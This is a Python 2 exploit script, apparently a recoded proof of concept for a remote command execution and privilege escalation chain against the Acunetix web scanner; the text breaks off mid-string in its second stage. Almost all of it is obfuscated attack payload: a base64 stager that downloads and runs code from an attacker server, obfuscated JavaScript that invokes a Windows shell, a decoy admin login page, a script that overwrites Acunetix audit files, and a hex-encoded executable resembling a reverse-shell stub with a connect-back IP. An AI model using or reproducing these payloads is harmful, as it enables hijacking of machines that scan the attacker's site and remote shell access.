#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
#recode by rezkyn
Acunetix  0day SYSTEM Remote Command Execution by Daniele Linguaglossa

PoC ini memanfaatkan 2 kerentanan di inti Acunetix, yang pertama adalah RCE (Remote Command Exec) dan yang kedua adalah
sebuah LPE (Local Privilege Escalation).

All credits for this exploit goes to Daniele Linguaglossa
"""

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from random import randint
from threading import Thread
from time import sleep
import binascii
import sys
import base64
import os


server = None


def gen_random_name(size):
    alphabet = "abcdefghilmnopqrstuvzABCDEFGHILMNOPQRSTUVZ0123456789"
    name = ""
    for i in range(0, size):
        name += alphabet[randint(0, len(alphabet) - 1)]
    return name + ".vbs"


def ip2b(ip):
    return "".join(binascii.hexlify(chr(int(t))) for t in ip.split("."))


def postexploitation():
    print "[*] Sleeping 1 minutes to elevate privileges...ZzZz"
    sleep(70)  # 2 minutes
    global server
    print "[!] Stopping server !"
    server.shutdown()
    print "[!] Exploit successful wait for session!"

# param URL,FILENAME
PAYLOAD_DOWNLOAD_EXEC = "dHNraWxsIHd2cw0KJGE9JycnDQogU2V0IGZzbyA9IENyZWF0ZU9iamVjdCgiU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmpl" \
                        "Y3QiKQ0KIFNldCB3c2hTaGVsbCA9IENyZWF0ZU9iamVjdCggIldTY3JpcHQuU2hlbGwiICkNCiBTZXQgT3V0cCA9IFdz" \
                        "Y3JpcHQuU3Rkb3V0DQogU2V0IEZpbGUgPSBXU2NyaXB0LkNyZWF0ZU9iamVjdCgiTWljcm9zb2Z0LlhNTEhUVFAiKQ0K" \
                        "IEZpbGUuT3BlbiAiR0VUIiwgImh0dHA6Ly8lcy9zdGFnZTIiLCBGYWxzZQ0KIE15RmlsZSA9IHdzaFNoZWxsLkV4cGFu" \
                        "ZEVudmlyb25tZW50U3RyaW5ncyggIiVzIiApKyJcJXMiDQogRmlsZS5TZW5kDQogU2V0IEJTID0gQ3JlYXRlT2JqZWN0" \
                        "KCJBRE9EQi5TdHJlYW0iKQ0KIEJTLnR5cGUgPSAxDQogQlMub3Blbg0KIEJTLldyaXRlIEZpbGUuUmVzcG9uc2VCb2R5" \
                        "DQogQlMuU2F2ZVRvRmlsZSBNeUZpbGUsIDINCiB3c2hTaGVsbC5ydW4gIndzY3JpcHQgIitNeUZpbGUNCiBmc28uRGVs" \
                        "ZXRlRmlsZShXc2NyaXB0LlNjcmlwdEZ1bGxOYW1lKQ0KICcnJw0KICRwdGggPSAoZ2V0LWl0ZW0gZW52OlRFTVApLlZh" \
                        "bHVlKyJcc3RhZ2VyLnZicyI7DQogZWNobyAkYSA+ICRwdGgNCiB3c2NyaXB0ICRwdGg="

# param connect back IP
PAYLOAD_METERPETRER = "4d5a90000300000004000000ffff0000b80000000000000040000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000800000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6" \
                      "e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000504500004c010300e4fb66ef000" \
                      "0000000000000e0000f030b01023800020000000e000000000000001000000010000000200000000040000010000000" \
                      "020000040000000100000004000000000000000040000000020000463a0000020000000000200000100000000010000" \
                      "0100000000000001000000000000000000000000030000064000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002e7" \
                      "465787400000028000000001000000002000000020000000000000000000000000000200030602e64617461000000" \
                      "900a000000200000000c000000040000000000000000000000000000200030e02e6964617461000064000000003000" \
                      "000002000000100000000000000000000000000000400030c000000000000000000000000000000000b800204000ff" \
                      "e090ff253830400090900000000000000000ffffffff00000000ffffffff0000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000009090909090909090909090" \
                      "90909090909090909090909090909090909033c0680810400064ff30648920fce8820000006089e531c0648b50308b" \
                      "520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b59" \
                      "2001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581" \
                      "c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd5b89" \
                      "001000029c454506829806b00ffd56a0568%s680200115c89e6505050504050405068ea0fdfe0ffd5976a105657689" \
                      "9a57461ffd585c0740aff4e0875ece8610000006a006a0456576802d9c85fffd583f8007e368b366a4068001000005" \
                      "66a006858a453e5ffd593536a005653576802d9c85fffd583f8007d225868004000006a0050680b2f0f30ffd557687" \
                      "56e4d61ffd55e5eff0c24e971ffffff01c329c675c7c3bbf0b5a2566a0053ffd5190f4da8a063058eceb8f7b69074c" \
                      "4e814a3cae54e8172c60ead9604f2e86b0522895f543ebf148fad021d6146ace15f4ae3dbf55185e896fcaede21b0f" \
                      "db55831cbcfb72949f584986c13ebc8dd35971d7cee480354c83bf909ab61c53b4412733e4cd8dc788890915d41c0b" \
                      "2e06b529fe28c90a777a1a2ff95dc2a6bd697544d0462c01750e7f053c3ee2e1277d13515df7d3dc5ee57419630faf" \
                      "f6c066e12a8ef76cb84891bb64b347b905ceaea1850bc52542cb5a967d538e70d8e7c5335132befb4f87450a5ecdf2" \
                      "7ec89b1ed56e6beb044a950a8022ab5d46d5ba6f37655d35296ade2911292b5179f53d148dffee01672f90f1d82c22" \
                      "b5e253c2637ed99e71e796953a070483bb13cab540c00873b6f5788a1a6e58663cf9cf2ff46b92cbcdad9215a101fb" \
                      "54c71d2112151a19faec99fe5256fced9417f9673ddbb87439860eccedf31e528837cda1251b974f2808bdfc70cafa" \
                      "e32fb6335cdda22e19e64fde514b779dc932bb8249f8d8f260fd457b719980bb069a1ed560e2c74d85182c3aacd499" \
                      "df5dab0e0a0cee9e1da02cff7b89aac3f99de68badc83c9acf3c7518cf1578a58c131e1f3f36d393a7da0979f48115" \
                      "9d687cd9e3d5bc9fe3d34b9c7aa362be497402f21045d1aa7b871e773facc169649d8f64c0ac91d2feb85063169af8" \
                      "87973643f41f9b5c38b01cb2eb327e17d1d0f7f5e8693022c729f69b83723df61b9617f533cf919740edbb92ca86f9" \
                      "f1db8cdf696531559d41193f2356414df49a8e22790a7cb174079b5273c485e252296d690796649048410e29fc8a4d" \
                      "3d3384a98beb5bca12574510183cbaa49f1eee2e7712df55312a40c18e636efe4e7066034e50060e3dcfc5354dc9d9" \
                      "4b570a97d0b47eadc715effc165f9660797fc3ed75d5940262419d75ea5670a029774fa83b5818a7d46a9764de62be" \
                      "e019444d30589d5d778499aaa0b3d10e7897d26fc5e446eb358c7067df52636d8a2ba7340f40e0c263522bb494500d" \
                      "c73585ee9208e29ac7cdf591316712f1624116dc48ebe2c9fa5743e1e4519f82b8be65db56c09e6ef563286050decd" \
                      "f9b327481b045b2073ea4e52ba5c6bb066c2f02709effd1db019cba7b8b682f16749d12ca8c89230edbbecfd59bf51" \
                      "11ea1e6c9ed24ec62bcc37bff84195329a97a41354be5f297dd0edc868edbd35c528f79b9debf6a132b0ee1c140151" \
                      "a90f0c6145149b01e6f55b7e6cc24f015a0f98627fee12834bcf368458827c4c824b1968aa4df58188c5909a95df1f" \
                      "288c88326ee731d240159bba27397cc8b0fe4995ac6445a9033279af56f156d22416b8915f5b64a1acca60e4c1c6b8" \
                      "f33af7431ed674bd62b6b26613cad5f9c9d395c95ee9acc56aacd0f4ea4e198fb6e061d012c91ffa99ecdc1510099f" \
                      "8a4d4fc45273e6687be92c729b719692bb5e197083c4f4b77a1df988cd81141686743fe0e1ace050dec96c0fd8d75e" \
                      "7182ea3cfc0f13c5cf804a8264c67166495837b6da837bb7e382527f63db2f94c75af6c855162aeb3b8a2c362819b9" \
                      "b1d586db76faa0c06346149d2c88379cf186e36056669d4e7cc433cb8205dd0d058c2f6ae74111eeaa6a5883b14e74" \
                      "482d130a665e53b6e89020d600be481779ee7b97631b897608d6933c65fcfc4f630dabe2d0dbad0af7c614d81b679d" \
                      "619ce6a7eefbf94664a40e4772f540dc1964a979f4c25e125844c2a7075f6a6f5fae46dada35d3e83f82d03f87b11e" \
                      "cfb4bf6636d727cf99dae040b8dd3c7abcdb98eabb7e71b56348ce6a3c635299efebc81690288bbab0f6cad2ebfd2a" \
                      "a3d7aa74724b97be8ff3f360017970203ed71039a06799828f0455620fe432ef1dbb79cb87478c6d67e177fa72cbc0" \
                      "c1422a65197e33ee6a4b314992beb18cbaa3bcd00f43cc2749ed61c8d8cb38f512bee5bdb4d4574c0c56b91da064bd" \
                      "5c358dab92d2431b3c90938b4d0ec9661c2e9c98942585466ff7f0a7a5b5b56d825673b46966750cedce33eb0de118" \
                      "c5c4211b1bfc6d297d5d48205ac40a8f47b78988807fa9d312465c1c080b158c01267965e443de442716d3fe8ac029" \
                      "7640ef6d5632eaa784cf2b2b7a884d0589c93d69f8f8d7c6dc2b75a0825c0c5e892268cf3af3843004dc68dd05d367" \
                      "6ac0b218d9adc3ecca734fe7fa61de3272584ed349fffa669175cd8a873b72b7dce3cb4a8e8afa8ddbba2039219220" \
                      "6e9dc808a2ac3f2b6909e71321437b8979f26b9a8bda1fde661229544cb34ebc3ce7a4e0c05d340ba65457c67c3d61" \
                      "5d249af5d333ab3894045480fa8bb3b6c75a41ed9dd00ec8367c68cd41b2b03caa30fc527a00d94b3c25620813ac9d" \
                      "522e6e86cfee45a4f711171ec17f167abc0c4abb6c80de587bb790a1f83b9428d8380832a8216a6b8ea47cac624a24" \
                      "ca171c95ebb6d81bd7676eff464d56436d32b66bb3d190e44e66beb412bd7d5d8978d7e0e93bb0e9f08944a6c45b4a" \
                      "b5e493e0dd1491352d8078b0a3bae30bc2c145bc4e5f9dfd9b457d5dd8ff9c635031b02e7f3b8927b09460b983883a" \
                      "dbb42bdff6f8c017b5096ce7d5a72ab620504be21555aa86871ee9e4887657b8e72d8813b429428596839d00c3e44f" \
                      "fe5297ce95fc340278d1d805370c54f64615db34797f523f0a4cd2523d10d1a1b62146051db23668bc482d802b66bf" \
                      "962f511ec6af7204cbb8d474204bf5c9e52ce0cfbd6298cf96f619a5d64827ba3284b25135965a9062f3cd7eb93745" \
                      "390e9cc983c9a54ec731699bbda53958382cbb2e2ecd3247b18e5c3d64755c0d1e112e8375b5795afdfee8b69879c8" \
                      "6597f79b6df2624dbe59557e8d13918c2d28c91c3a4f49a8682b62648259d118ffa02b2218efa031b45fd54c0b8d14" \
                      "23d494b0a5da8e97ec345e17f9db32e9bec5cbcc36357b4ba8e7b8ccddc192d360d99a1e805dedc0ecadca15a0334f" \
                      "680b0a9e91e12698ba69d27d86b2394c3d91682194ba312e8aef801a9ebc8722af9e8bd1180c0eed3137bfe109b06c" \
                      "a442777eae4e1a145302152777da0a0a1decef0e0c73f2709cdb61360961eb1fc47cec9a893b9a8b2ec9f5a7fcce3e" \
                      "178b459a54d9c5e40c6aada77896a7ee9054324019fe61e954c60dfd7bc895011c951e09fc195e779b71fc33833cdb" \
                      "a5fe76ceb9a7b6ba5a39ed2e80c5d91b15cef0e1f5cb956b90e6db947fa45a4ae0e668b72a056dd29ea81c8b3aa126" \
                      "b35d40c6dfa042cbd19c42b7ef44e6ef7b35952dbc796097530a04a71a3c116e99bf4a4ae8199685cc7e1e9f03a1ce" \
                      "a8eb6d579e1e2ae0800000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "00000002c3000000000000000000000543000003830000000000000000000000000000000000000000000000000000" \
                      "040300000000000000000000040300000000000009c004578697450726f63657373000000003000004b45524e454c3" \
                      "3322e646c6c00000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" \
                      "17aa9f565fccd8ce423701840cda9828320ce06749de816ae27196bce0849d1b494f89ffd49"

# param CMD => PAYLOAD_DOWNLOAD_EXEC
EXPLOIT_STAGE_1 = "PGh0bWw+PGhlYWQ+PC9oZWFkPjxib2R5PjxzY3JpcHQ+d2luZG93LmFsZXJ0ID0genl4O3dpbmRvdy5wcm9tcHQgPSB6eXg7d" \
                  "2luZG93LmNvbmZpcm0gPSB6eXg7d2luZG93LmNhbGxlZCA9IDA7ZnVuY3Rpb24genl4KCl7d2luZG93LmNhbGxlZCA9IDE7dm" \
                  "FyIHh5ej0iJXMiO2V2YWwoZnVuY3Rpb24ocCxhLGMsayxlLGQpe2U9ZnVuY3Rpb24oYyl7cmV0dXJuIGMudG9TdHJpbmcoMzY" \
                  "pfTtpZighJycucmVwbGFjZSgvXi8sU3RyaW5nKSl7d2hpbGUoYy0tKXtkW2MudG9TdHJpbmcoYSldPWtbY118fGMudG9TdHJp" \
                  "bmcoYSl9az1bZnVuY3Rpb24oZSl7cmV0dXJuIGRbZV19XTtlPWZ1bmN0aW9uKCl7cmV0dXJuJ1xcdysnfTtjPTF9O3doaWxlK" \
                  "GMtLSl7aWYoa1tjXSl7cD1wLnJlcGxhY2UobmV3IFJlZ0V4cCgnXFxiJytlKGMpKydcXGInLCdnJyksa1tjXSl9fXJldHVybi" \
                  "BwfSgnNSAwPTYgNCgiMy4xIik7MC4yKFwnNyAvOCBkIC9lICIiICJjIiAtYiA5IC1hICJmIlwnKTsnLDE2LDE2LCdceDczXHg" \
                  "2OFx4NjVceDZjXHg2Y3xceDUzXHg2OFx4NjVceDZjXHg2Y3xceDcyXHg3NVx4NmV8XHg1N1x4NTNceDYzXHg3Mlx4NjlceDcw" \
                  "XHg3NHxceDQxXHg2M1x4NzRceDY5XHg3Nlx4NjVceDU4XHg0Zlx4NjJceDZhXHg2NVx4NjNceDc0fHZhcnxuZXd8XHg2M1x4N" \
                  "mRceDY0fEN8Tm9ybWFsfFx4NjVceDZlXHg2M1x4NmZceDY0XHg2NVx4NjRceDYzXHg2Zlx4NmRceDZkXHg2MVx4NmVceDY0fH" \
                  "dpbmRvd1x4NzNceDc0XHg3OVx4NmNceDY1fFx4NzBceDZmXHg3N1x4NjVceDcyXHg3M1x4NjhceDY1XHg2Y1x4NmN8XHg3M1x" \
                  "4NzRceDQxXHg1Mlx4NzR8QnwkJCcucmVwbGFjZSgiJCQiLHh5eikuc3BsaXQoJ3wnKSwwLHt9KSk7ZG9jdW1lbnQuYm9keS5p" \
                  "bm5lckhUTUw9JzQwNCBOb3QgZm91bmQnO308L3NjcmlwdD4lczxzY3JpcHQ+aWYgKHdpbmRvdy5jYWxsZWQgPT0gMCl7enl4K" \
                  "Ck7fTwvc2NyaXB0PjwvYm9keT48L2h0bWw+"


LOGIN_FORM = "PHN0eWxlPg0KYm9keXsNCiAgbWFyZ2luOiAwcHg7DQogIHBhZGRpbmc6IDBweDsNCiAgYmFja2dyb3VuZDogIzFhYmM5ZDsNCn0NCg" \
             "0KaDF7DQogIGNvbG9yOiAjZmZmOw0KICB0ZXh0LWFsaWduOiBjZW50ZXI7DQogIGZvbnQtZmFtaWx5OiBBcmlhbDsNCiAgZm9udC13Z" \
             "WlnaHQ6IG5vcm1hbDsNCiAgbWFyZ2luOiAyZW0gYXV0byAwcHg7DQp9DQoub3V0ZXItc2NyZWVuew0KICBiYWNrZ3JvdW5kOiAjMTMy" \
             "MDJjOw0KICB3aWR0aDogOTAwcHg7DQogIGhlaWdodDogNTQwcHg7DQogIG1hcmdpbjogNTBweCBhdXRvOw0KICBib3JkZXItcmFkaXV" \
             "zOiAyMHB4Ow0KICAtbW96LWJvcmRlci1yYWRpdXM6IDIwcHg7DQogIC13ZWJraXQtYm9yZGVyLXJhZGl1czogMjBweDsNCiAgcG9zaXR" \
             "pb246IHJlbGF0aXZlOw0KICBwYWRkaW5nLXRvcDogMzVweDsNCn0NCg0KLm91dGVyLXNjcmVlbjpiZWZvcmV7DQogIGNvbnRlbnQ6IC" \
             "IiOw0KICBiYWNrZ3JvdW5kOiAjM2U0YTUzOw0KICBib3JkZXItcmFkaXVzOiA1MHB4Ow0KICBwb3NpdGlvbjogYWJzb2x1dGU7DQogI" \
             "GJvdHRvbTogMjBweDsNCiAgbGVmdDogMHB4Ow0KICByaWdodDogMHB4Ow0KICBtYXJnaW46IGF1dG87DQogIHotaW5kZXg6IDk5OTk" \
             "7DQogIHdpZHRoOiA1MHB4Ow0KICBoZWlnaHQ6IDUwcHg7DQp9DQoub3V0ZXItc2NyZWVuOmFmdGVyew0KICBjb250ZW50OiAiIjsNCi" \
             "AgYmFja2dyb3VuZDogI2VjZjBmMTsNCiAgd2lkdGg6IDkwMHB4Ow0KICBoZWlnaHQ6IDg4cHg7DQogIHBvc2l0aW9uOiBhYnNvbHV0Z" \
             "TsNCiAgYm90dG9tOiAwcHg7DQogIGJvcmRlci1yYWRpdXM6IDBweCAwcHggMjBweCAyMHB4Ow0KICAtbW96LWJvcmRlci1yYWRpdXM6" \
             "IDBweCAwcHggMjBweCAyMHB4Ow0KICAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDBweCAwcHggMjBweCAyMHB4Ow0KfQ0KDQouc3RhbmR" \
             "7DQogIHBvc2l0aW9uOiByZWxhdGl2ZTsgIA0KfQ0KDQouc3RhbmQ6YmVmb3Jlew0KICBjb250ZW50OiAiIjsNCiAgcG9zaXRpb246IG" \
             "Fic29sdXRlOw0KICBib3R0b206IC0xNTBweDsNCiAgYm9yZGVyLWJvdHRvbTogMTUwcHggc29saWQgI2JkYzNjNzsNCiAgYm9yZGVyL" \
             "WxlZnQ6IDMwcHggc29saWQgdHJhbnNwYXJlbnQ7DQogIGJvcmRlci1yaWdodDogMzBweCBzb2xpZCB0cmFuc3BhcmVudDsNCiAgd2lkd" \
             "Gg6IDIwMHB4Ow0KICBsZWZ0OiAwcHg7DQogIHJpZ2h0OiAwcHg7DQogIG1hcmdpbjogYXV0bzsNCn0NCg0KLnN0YW5kOmFmdGVyew0K" \
             "ICBjb250ZW50OiAiIjsNCiAgcG9zaXRpb246IGFic29sdXRlOw0KICB3aWR0aDogMjYwcHg7DQogIGxlZnQ6IDBweDsNCiAgcmlnaHQ6" \
             "IDBweDsNCiAgbWFyZ2luOiBhdXRvOw0KICBib3JkZXItYm90dG9tOiAzMHB4IHNvbGlkICNiZGMzYzc7DQogIGJvcmRlci1sZWZ0OiA" \
             "zMHB4IHNvbGlkIHRyYW5zcGFyZW50Ow0KICBib3JkZXItcmlnaHQ6IDMwcHggc29saWQgdHJhbnNwYXJlbnQ7DQogIGJvdHRvbTogLT" \
             "E4MHB4Ow0KICBib3gtc2hhZG93OiAwcHggNHB4IDBweCAjN2U3ZTdlDQp9DQoNCi5pbm5lci1zY3JlZW57DQogIHdpZHRoOiA4MDBwe" \
             "DsNCiAgaGVpZ2h0OiAzNDBweDsNCiAgYmFja2dyb3VuZDogIzFhYmM5ZDsNCiAgbWFyZ2luOiAwcHggYXV0bzsNCiAgcGFkZGluZy10" \
             "b3A6IDgwcHg7DQp9DQoNCi5mb3Jtew0KICB3aWR0aDogNDAwcHg7DQogIGhlaWdodDogMjMwcHg7DQogIGJhY2tncm91bmQ6ICNlZGV" \
             "mZjE7DQogIG1hcmdpbjogMHB4IGF1dG87DQogIHBhZGRpbmctdG9wOiAyMHB4Ow0KICBib3JkZXItcmFkaXVzOiAxMHB4Ow0KICAtbW" \
             "96LWJvcmRlci1yYWRpdXM6IDEwcHg7DQogIC13ZWJraXQtYm9yZGVyLXJhZGl1czogMTBweDsNCn0NCg0KaW5wdXRbdHlwZT0idGV4d" \
             "CJdew0KICBkaXNwbGF5OiBibG9jazsNCiAgd2lkdGg6IDMwOXB4Ow0KICBoZWlnaHQ6IDM1cHg7DQogIG1hcmdpbjogMTVweCBhdXRv" \
             "Ow0KICBiYWNrZ3JvdW5kOiAjZmZmOw0KICBib3JkZXI6IDBweDsNCiAgcGFkZGluZzogNXB4Ow0KICBmb250LXNpemU6IDE2cHg7DQo" \
             "gICBib3JkZXI6IDJweCBzb2xpZCAjZmZmOw0KICB0cmFuc2l0aW9uOiBhbGwgMC4zcyBlYXNlOw0KICBib3JkZXItcmFkaXVzOiA1cH" \
             "g7DQogIC1tb3otYm9yZGVyLXJhZGl1czogNXB4Ow0KICAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDVweDsNCn0NCg0KaW5wdXRbdHlwZ" \
             "T0idGV4dCJdOmZvY3Vzew0KICBib3JkZXI6IDJweCBzb2xpZCAjMWFiYzlkDQp9DQoNCmlucHV0W3R5cGU9InN1Ym1pdCJdew0KICBk" \
             "aXNwbGF5OiBibG9jazsNCiAgYmFja2dyb3VuZDogIzFhYmM5ZDsNCiAgd2lkdGg6IDMxNHB4Ow0KICBwYWRkaW5nOiAxMnB4Ow0KICB" \
             "jdXJzb3I6IHBvaW50ZXI7DQogIGNvbG9yOiAjZmZmOw0KICBib3JkZXI6IDBweDsNCiAgbWFyZ2luOiBhdXRvOw0KICBib3JkZXItcm" \
             "FkaXVzOiA1cHg7DQogIC1tb3otYm9yZGVyLXJhZGl1czogNXB4Ow0KICAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDVweDsNCiAgZm9u" \
             "dC1zaXplOiAxN3B4Ow0KICB0cmFuc2l0aW9uOiBhbGwgMC4zcyBlYXNlOw0KfQ0KDQppbnB1dFt0eXBlPSJzdWJtaXQiXTpob3ZlcnsN" \
             "CiAgYmFja2dyb3VuZDogIzA5Y2NhNg0KfQ0KDQphew0KICB0ZXh0LWFsaWduOiBjZW50ZXI7DQogIGZvbnQtZmFtaWx5OiBBcmlhbDs" \
             "NCiAgY29sb3I6IGdyYXk7DQogIGRpc3BsYXk6IGJsb2NrOw0KICBtYXJnaW46IDE1cHggYXV0bzsNCiAgdGV4dC1kZWNvcmF0aW9uOi" \
             "Bub25lOw0KICB0cmFuc2l0aW9uOiBhbGwgMC4zcyBlYXNlOw0KICBmb250LXNpemU6IDEycHg7DQp9DQoNCmE6aG92ZXJ7DQogIGNvb" \
             "G9yOiAjMWFiYzlkOw0KfQ0KDQoNCjo6LXdlYmtpdC1pbnB1dC1wbGFjZWhvbGRlciB7DQogICBjb2xvcjogZ3JheTsNCn0NCg0KOi1" \
             "tb3otcGxhY2Vob2xkZXIgeyAvKiBGaXJlZm94IDE4LSAqLw0KICAgY29sb3I6IGdyYXk7ICANCn0NCg0KOjotbW96LXBsYWNlaG9sZG" \
             "VyIHsgIC8qIEZpcmVmb3ggMTkrICovDQogICBjb2xvcjogZ3JheTsgIA0KfQ0KDQo6LW1zLWlucHV0LXBsYWNlaG9sZGVyIHsgIA0KI" \
             "CAgY29sb3I6IGdyYXk7ICANCn0NCjwvc3R5bGU+DQo8aDE+QWRtaW4gcGFuZWw8L2gxPg0KPGRpdiBjbGFzcz0ic3RhbmQiPg0KICA8" \
             "ZGl2IGNsYXNzPSJvdXRlci1zY3JlZW4iPg0KICAgIDxkaXYgY2xhc3M9ImlubmVyLXNjcmVlbiI+DQogICAgICA8ZGl2IGNsYXNzPSJ" \
             "mb3JtIj4NCiAgICAgIDxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSIvbG9naW4iPg0KICAgICAgICA8aW5wdXQgdHlwZT0idGV4dC" \
             "IgbmFtZT0idXNyIiBwbGFjZWhvbGRlcj0iVXNlcm5hbWUiIC8+DQogICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJwd2QiI" \
             "HBsYWNlaG9sZGVyPSJQYXNzd29yZCIgLz4NCiAgICAgICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJMb2dpbiIgLz4NCiAg" \
             "ICAgICAgIDwvZm9ybT4NCiAgICAgICAgPGEgaHJlZj0iL2ZvcmdvdCI+TG9zdCB5b3VyIHBhc3N3b3JkPzwvYT4NCiAgICAgIDwvZGl" \
             "2PiANCiAgICA8L2Rpdj4gDQogIDwvZGl2PiANCjwvZGl2Pg=="

# param NO
EXPLOIT_STAGE_2 = "U2V0IGZzbyA9IENyZWF0ZU9iamVjdCgiU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3QiKQ0KRnVuY3Rpb24gRXNjYWxhdGVBbm" \
                  "RFeGVjdXRlKCkNCiAgYmluZCA9ICJTZXQgb2JqID0gQ3JlYXRlT2JqZWN0KCIiU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3Q" \
                  "iIikiICYgdmJjcmxmICZfDQogICJvYmouRGVsZXRlRmlsZSgiIkM6XFByb2dyYW1EYXRhXEFjdW5ldGl4IFdWUyAxMFxEYXRhX" \
                  "FNjcmlwdHNcUGVyU2VydmVyXEFKUF9BdWRpdC5zY3JpcHQiIikiICYgdmJjcmxmICZfDQogICAib2JqLk1vdmVGaWxlICIiQzp" \
                  "cUHJvZ3JhbURhdGFcQWN1bmV0aXggV1ZTIDEwXERhdGFcU2NyaXB0c1xQZXJTZXJ2ZXJcQUpQX0F1ZGl0LnNjcmlwdC5iYWsiI" \
                  "iwgIiJDOlxQcm9ncmFtRGF0YVxBY3VuZXRpeCBXVlMgMTBcRGF0YVxTY3JpcHRzXFBlclNlcnZlclxBSlBfQXVkaXQuc2NyaXB" \
                  "0IiIgIiAmIHZiY3JsZiAmXw0KICAiRnVuY3Rpb24gUkVPbnJZSmUoKSIgJiB2YmNybGYgJl8NCiAgIk5tU1ROUFVyb0lLdFRxID" \
                  "0gIiIlcyIiIiAmIHZiY3JsZiAmXw0KICAiRGltIGdVdERzem1uR050IiAmIHZiQ3JsZiAmXw0KICAiU2V0IGdVdERzem1uR050I" \
                  "D0gQ3JlYXRlT2JqZWN0KCIiU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3QiIikiICYgdmJjcmxmICZfDQogICJEaW0gaE1XRkN" \
                  "6dUciICYgdmJjcmxmICZfDQogICJEaW0gZXJtbVRDalJ4SWpjWEciICYgdmJjcmxmICZfDQogICJEaW0ga0xrdVdOYnhuTFVIe" \
                  "HR6IiAmIHZiY3JsZiAmXw0KICAiRGltIHJDUWNUekFBalJ4dSIgJiB2YmNybGYgJl8NCiAgIlNldCBlcm1tVENqUnhJamNYRyA" \
                  "9IGdVdERzem1uR050LkdldFNwZWNpYWxGb2xkZXIoMikiICYgdmJjcmxmICZfDQogICJyQ1FjVHpBQWpSeHUgPSBlcm1tVENqU" \
                  "nhJamNYRyAmICIiXCIiICYgZ1V0RHN6bW5HTnQuR2V0VGVtcE5hbWUoKSIgJiB2YmNybGYgJl8NCiAgImdVdERzem1uR050LkN" \
                  "yZWF0ZUZvbGRlcihyQ1FjVHpBQWpSeHUpIiAmIHZiY3JsZiAmXw0KICAia0xrdVdOYnhuTFVIeHR6ID0gckNRY1R6QUFqUnh1I" \
                  "CYgIiJcIiIgJiAiIk5ObWxmVmhqYld3emNqLmV4ZSIiIiAmIHZiY3JsZiAmXw0KICAiU2V0IGhNV0ZDenVHID0gZ1V0RHN6bW5" \
                  "HTnQuQ3JlYXRlVGV4dEZpbGUoa0xrdVdOYnhuTFVIeHR6LCB0cnVlICwgZmFsc2UpICIgJiB2YmNybGYgJl8NCiAgIkZvciBpI" \
                  "D0gMSB0byBMZW4oTm1TVE5QVXJvSUt0VHEpIFN0ZXAgMiIgJiB2YmNybGYgJl8NCiAgIiAgICBoTVdGQ3p1Ry5Xcml0ZSBDaHI" \
                  "oQ0xuZygiIiZIIiIgJiBNaWQoTm1TVE5QVXJvSUt0VHEsaSwyKSkpIiAmIHZiY3JsZiAmXw0KICAiTmV4dCIgJiB2YmNybGYgJ" \
                  "l8NCiAgImhNV0ZDenVHLkNsb3NlIiAmIHZiY3JsZiAmXw0KICAiRGltIHlFU3pGdUlNb211IiAmIHZiY3JsZiAmXw0KICAiU2V" \
                  "0IHlFU3pGdUlNb211ID0gQ3JlYXRlT2JqZWN0KCIiV3NjcmlwdC5TaGVsbCIiKSIgJiB2YmNybGYgJl8NCiAgInlFU3pGdUlNb" \
